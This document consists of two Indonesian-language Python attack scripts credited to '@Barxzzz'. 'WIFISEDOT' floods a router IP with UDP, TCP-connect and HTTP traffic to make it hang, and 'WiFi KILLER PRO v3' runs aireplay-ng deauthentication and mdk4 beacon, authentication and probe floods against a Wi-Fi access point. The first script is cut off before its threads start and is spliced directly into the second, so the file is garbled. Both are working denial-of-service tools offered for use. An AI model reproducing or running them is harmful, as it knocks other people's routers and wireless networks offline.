#!/usr/bin/env python3
import requests
import threading
import random
import time
import socket
import os
import sys

# Warna
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

banner = f"""
{C}╔═══════════════════════════════════════════╗
║    💀 WIFISEDOT - MODE NGELEK 💀          ║
║    Created by : @Barxzzz                  ║
║    Efek      : Router hang / restart      ║
╚═══════════════════════════════════════════╝{W}
"""
print(banner)

target_ip = input(f"{G}[?] IP Router (contoh: 192.168.1.1): {W}")
port = int(input(f"{G}[?] Port (80/443/53/67): {W}") or 80)
threads = int(input(f"{G}[?] Jumlah thread (100-1000): {W}") or 300)
durasi = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)

stop = False
counter = 0
lock = threading.Lock()

# ========== UDP FLOOD ==========
def udp_flood():
    global counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ports = [53, 67, 68, 123, 161, 443]
    while not stop:
        try:
            target_port = random.choice(ports)
            data = random._urandom(2048)
            sock.sendto(data, (target_ip, target_port))
            with lock:
                counter += 1
                print(f"{C}[UDP] #{counter} -> {target_ip}:{target_port}{W}")
        except:
            pass
        time.sleep(0.001)

# ========== SYN FLOOD ==========
def syn_flood():
    global counter
    while not stop:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, port))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
            with lock:
                counter += 1
                print(f"{G}[SYN] #{counter} connected{W}")
        except:
            with lock:
                counter += 1
                print(f"{Y}[SYN] #{counter} failed{W}")
        time.sleep(0.001)

# ========== HTTP FLOOD ==========
def http_flood():
    global counter
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)",
        "Mozilla/5.0 (Linux; Android 13)"
    ]
    paths = ["/", "/cgi-bin/", "/admin/", "/status", "/api/v1"]
    while not stop:
        try:
            url = f"http://{target_ip}:{port}{random.choice(paths)}"
            r = requests.get(url, headers={"User-Agent": random.choice(uas)}, timeout=2)
            with lock:
                counter += 1
                print(f"{G}[HTTP] #{counter} OK{W}")
        except:
            with lock:
                counter += 1
                print(f"{Y}[HTTP] #{counter} failed{W}")
        time.sleep(0.01)

print(f"\n{G}[+] Menyerang {target_ip} dengan {threads} thread{W}")
print(f"{G}[+] Durasi: {'Forever' if durasi == 0 else str(durasi) + ' detik'}{W}")
print(f"{G}[+] Router akan ngelek dalam hitungan detik{W}\n")

# Jalankan semua serangan
#!/usr/bin/env python3
import os
import time
import random
import threading
import subprocess

G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

banner = f"""
{C}╔═══════════════════════════════════════════╗
║   🔥 WiFi KILLER PRO v3 - BARZZ_BOT 🔥    ║
║        Created by : @Barxzzz               ║
║        Mode       : Full Destroy           ║
╚═══════════════════════════════════════════╝{W}
"""
print(banner)

# === Input ===
interface = input(f"{G}[?] Interface monitor (contoh: wlan0mon): {W}") or "wlan0mon"
bssid = input(f"{G}[?] BSSID router (contoh: 00:11:22:33:44:55): {W}")
channel = input(f"{G}[?] Channel (1-11): {W}") or "6"
duration = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)

# === Set channel ===
os.system(f"sudo iwconfig {interface} channel {channel}")

# === Fungsi serangan ===
def deauth_all():
    while True:
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {interface}")
        time.sleep(0.5)

def deauth_client():
    while True:
        os.system(f"sudo aireplay-ng -0 0 -a {bssid} -c ff:ff:ff:ff:ff:ff {interface}")
        time.sleep(0.5)

def beacon_flood():
    while True:
        os.system(f"sudo mdk4 {interface} b -c {channel} -s 1000")
        time.sleep(1)

def auth_dos():
    while True:
        os.system(f"sudo mdk4 {interface} a -a {bssid} -s 1000")
        time.sleep(1)

def probe_flood():
    while True:
        os.system(f"sudo mdk4 {interface} p -c {channel} -s 1000")
        time.sleep(1)

# === Jalankan semua serangan paralel ===
threads = [
    threading.Thread(target=deauth_all),
    threading.Thread(target=deauth_client),
    threading.Thread(target=beacon_flood),
    threading.Thread(target=auth_dos),
    threading.Thread(target=probe_flood)
]

print(f"\n{G}[+] Target BSSID: {bssid}{W}")
print(f"{G}[+] Channel: {channel}{W}")
print(f"{G}[+] Interface: {interface}{W}")
print(f"{G}[+] Memulai semua serangan...{W}\n")

for t in threads:
    t.daemon = True
    t.start()

# === Durasi ===
if duration > 0:
    time.sleep(duration)
    print(f"\n{R}[!] Durasi habis, menghentikan serangan{W}")
    os.system("pkill -f aireplay-ng")
    os.system("pkill -f mdk4")
else:
    input(f"\n{Y}[!] Tekan ENTER untuk stop{W}")
    os.system("pkill -f aireplay-ng")
    os.system("pkill -f mdk4")

print(f"\n{G}═══════════════════════════════════════════{W}")
print(f"{G}[✓] SERANGAN DIHENTIKAN{W}")
print(f"{R}[✓] Router target kemungkinan sudah mati / restart{W}")
print(f"{G}═══════════════════════════════════════════{W}")
